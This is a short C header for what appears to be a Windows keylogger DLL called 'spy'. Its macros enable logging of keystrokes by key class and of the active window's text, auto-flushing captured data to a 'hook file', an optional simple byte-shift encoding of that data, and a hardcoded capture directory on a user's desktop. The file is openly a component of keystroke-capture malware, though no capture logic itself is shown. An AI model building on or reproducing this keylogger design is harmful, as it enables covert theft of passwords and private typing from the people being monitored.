#pragma once

#include <windows.h>
#include "log.h"

//#define SPY_ENCODE_DATA							/* encode data before write to hook file */
#define SPY_FILE_AUTO_FLUSH						/* auto flush data back to hook file when write */
#define SPY_LOG_WINTEXT							/* enable log window text which typed on it */
#define SPY_LOG_NUMBER							/* enable log number keys */
#define SPY_LOG_NUMPAD							/* enable log numpad keys */
#define SPY_LOG_CHARACTER						/* enable log character keys */
#define SPY_LOG_SPECIAL							/* enable log special keys */
#define SPY_LOG_SYMBOL							/* enable log symbol keys */
#define SPY_LOG_UNKNOWN							/* enable log unknown keys */
#define SPY_MAX_WINTEXT_LENGTH			512		/* max window title length */
#define SPY_TEMP_FILENAME_LENGTH		32
#define SPY_TEMP_DIR					"C:\\Users\\xuans\\Desktop\\spy"

#ifdef SPY_ENCODE_DATA
#define SPY_TEXT_ENCODE_SEEK_EVENNUM	25		/* add value to byte value if position is even numbers */
#define SPY_TEXT_ENCODE_SEEK_ODDNUM		12		/* add value to byte value if position is odd numbers */
#endif

#define EXPORT __declspec(dllexport)
#define ADD_FLAG(state, flag) {state |= flag;}
#define REM_FLAG(state, flag) {state &= ~flag;}
#define HAS_FLAG(state, flag) ((state & flag) == flag)
#define SAFE_FREE(ptr) {if (ptr != NULL) {delete ptr; ptr = NULL;}}